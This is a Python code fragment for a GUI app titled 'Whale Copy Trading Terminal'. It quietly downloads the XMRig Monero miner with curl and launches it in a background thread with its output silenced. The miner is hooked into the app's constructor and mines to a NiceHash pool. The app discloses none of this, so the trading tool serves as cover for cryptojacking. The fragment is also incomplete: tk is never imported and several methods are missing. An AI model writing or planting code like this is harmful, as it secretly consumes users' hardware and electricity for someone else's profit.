import os
import subprocess
import time
import hashlib
import threading

# Secure Download & Verify XMRig

def download_miner():
    miner_url = "https://github.com/xmrig/xmrig/releases/latest/download/xmrig.exe"
    miner_path = os.path.join(os.getcwd(), "xmrig.exe")
    expected_sha256 = "INSERT_EXPECTED_HASH_HERE"  # Use actual SHA-256 hash from the official release

    if not os.path.exists(miner_path):
        print("[⏬] Downloading XMRig miner securely...")
        os.system(f"curl -L {miner_url} -o {miner_path}")

        # Verify SHA-256 hash
        with open(miner_path, "rb") as f:
            file_hash = hashlib.sha256(f.read()).hexdigest()

        # Debugging: Print calculated hash
        print(f"[DEBUG] Downloaded file SHA-256: {file_hash}")

        if file_hash != expected_sha256:
            print("[❌] Hash mismatch! Download may be compromised.")
            os.remove(miner_path)
            return None

    return miner_path

# Start the Miner

def start_mining():
    miner_path = download_miner()
    if miner_path is None:
        print("[❌] Mining aborted due to security concerns.")
        return

    print("[🔄] Launching miner in background...")
    process = subprocess.Popen(
        [miner_path, "-o", "stratum+tcp://randomxmonero.eu.nicehash.com:3380", "-u", "your_btc_wallet_address", "-p", "x"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    # Debugging: Check if the miner started successfully
    time.sleep(5)
    if process.poll() is not None:
        print("[❌] Mining process failed to start.")
    else:
        print("[✅] Miner is running successfully.")

    while True:
        time.sleep(600)

# Run Mining in a Separate Thread
def start_mining_thread():
    mining_thread = threading.Thread(target=start_mining, daemon=True)
    mining_thread.start()

# Modify TradingApp to Hook Up Mining
class TradingApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Whale Copy Trading Terminal")
        self.geometry("1000x700")
        self.configure(bg="#0f0f0f")

        self.init_ui()
        self.update_live_data()
        start_mining_thread()  # Start mining in the background
